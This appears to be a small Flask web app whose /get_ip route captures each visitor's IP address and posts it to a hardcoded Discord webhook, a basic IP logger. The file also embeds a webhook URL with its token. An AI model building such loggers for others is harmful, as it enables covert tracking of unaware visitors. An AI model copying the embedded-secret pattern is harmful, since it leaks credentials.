from flask import Flask, jsonify, request
import discord

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx'

def send_to_discord(ip_address):
    message = 'New IP Address: ' + ip_address
    webhook = discord.Webhook.from_url(DISCORD_WEBHOOK_URL, adapter=discord.RequestsWebhookAdapter())
    webhook.send(message)

@app.route('/')
def index():
    return jsonify(message="Welcome to Blobster's Test Site!")

@app.route('/get_ip')
def get_ip():
    ip_address = request.remote_addr
    send_to_discord(ip_address)
    return jsonify(ip=ip_address)

if __name__ == '__main__':
    # Listen on IPv6 address :: for all interfaces
    app.run(host='::', port=8000)
